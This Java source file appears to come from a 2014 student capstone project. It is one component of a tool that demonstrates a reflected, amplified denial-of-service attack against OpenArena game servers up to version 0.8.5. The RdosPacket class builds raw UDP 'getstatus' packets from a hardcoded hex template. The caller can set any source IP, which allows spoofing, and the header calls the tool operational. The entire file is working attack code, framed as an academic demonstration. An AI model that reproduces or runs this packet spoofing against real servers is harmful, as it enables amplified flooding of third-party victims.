/** 
 * Class: CMSC495 Spring 2014
 * Assignment: Capstone, Week 6, Sprint 1
 * 
 * Team Members: Brad Norman, Jamie Lane, Daniel Ross
 * 
 * Date: 26 April 2014 
 * 
 * File:	RdosTester.java (main application) 	
 * 			->Packet.java<-
 * 			PacketTransmitter.java
 * 			Analysis.java
 * 			
 * 			Demonstrate a reflected and amplified Denial-of-Service attack mechanism
 * 			exploiting a vulnerability in Open Arena server versions <= 0.8.5
 * 
 * Current Status: Operational as described
 * 
 * @author Daniel Ross
 *           
 **/

package teamC;

//create packet in memory
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.JPacket;
import org.jnetpcap.protocol.JProtocol;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

// models an IP packet
public class RdosPacket {
	
	// source address
	String srcIp;
	
	// destination address
	String dstIp;
	
	// destination port
	String dstPort;
	
	// base getStatus request packet, includes IPv4 header, UDP header, UDP data
	String packetBase = "ffffffffffff001fbc01b4db0800450000293cbd400080118c93c0a8"
			          + "580ac0a858186d386d380015319affffffff676574737461747573";	

	// complete IP packet
	String completePacket;
	
	// size of packet in bytes
	int packetSize;	
	
	// constructor requiring complete packet as String representing hex
	// useful for received packets
	public RdosPacket(String completePacket)
	{
		this.completePacket = completePacket;
		packetSizeCalc();
	
	}	// end Packet constructor

	// constructor requiring source and destination address and port info
	// useful for creating packets to transmit, requires checksums to be updated before transmission
	public RdosPacket(int srcIP1, int srcIP2, int srcIP3, int srcIP4, int dstIP1, int dstIP2, int dstIP3, int dstIP4, int port)
	{
		// convert source address to hex, add leading zeroes if necessary, concatenate
		this.srcIp = formatOctet(srcIP1) + formatOctet(srcIP2) + formatOctet(srcIP3) + formatOctet(srcIP4);
		
		// convert destination address to hex, add leading zeroes if necessary, concatenate
		this.dstIp = formatOctet(dstIP1) + formatOctet(dstIP2) + formatOctet(dstIP3) + formatOctet(dstIP4);
		
		// convert destination port to hex, add leading zeroes if necessary
		this.dstPort = formatPort(port);
		
		// overwrite packetBase IP and UDP header fields with user specified info
		packetRewrite();
		
		// calculate packet size in bytes
		packetSizeCalc();
		
	}  // end Packet constructor
	
	// calculate packet size in bytes
	private void packetSizeCalc() {
		
		packetSize = completePacket.length() / 2;
		
	}  // end method packetSizeCalc	
	
	// converts integer representation of IP address octets into a hex string, with leading zeroes
	private String formatOctet(int octet)
	{
		return Integer.toHexString(0x100 | octet).substring(1);
	
	}  // end method formatOctet
	
	// converts integer representation of network port into a hex string, with leading zeroes
	private String formatPort(int port)
	{
		return Integer.toHexString(0x10000 | port).substring(1);
	
	} // end method formatPort
	
	// overwrite packetBase IP and UDP header fields with user specified info
	private void packetRewrite()
	{
		completePacket = packetBase.substring(0,24) + srcIp + dstIp + packetBase.substring(40,44) + dstPort + packetBase.substring(48,packetBase.length());
		
	} // end method packetRewrite
	
	// return packet size
	public int getPacketSize() {
		
		return packetSize;
	
	} // end method getPacketSize
	
	// returns completePacket as string representation of packet object 	
	public String toString()
	{
		return completePacket;
	
	}  // end method toString

} // end class Packet